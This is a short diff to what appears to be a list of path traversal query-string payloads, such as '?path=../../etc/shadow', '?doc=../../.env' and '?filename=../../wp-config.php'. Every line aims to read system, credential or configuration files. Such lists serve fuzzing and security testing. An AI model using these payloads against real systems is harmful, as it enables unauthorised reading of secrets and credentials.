@@ -1,6 +1,10 @@
 ?file=../../etc/passwd
-?filename=../config.php
-?path=/etc/shadow
-?export=../../secret.key
-?template=../../etc/passwd
-?log=/var/log/../../etc/passwd
+?path=../../etc/shadow
+?filename=../../wp-config.php
+?doc=../../.env
+?template=../../config.php
+?name=../../etc/hosts
+?output=../../var/log/auth.log
+?download=../../backup.sql
+?export=../../database.yml
+?log=../../etc/passwd
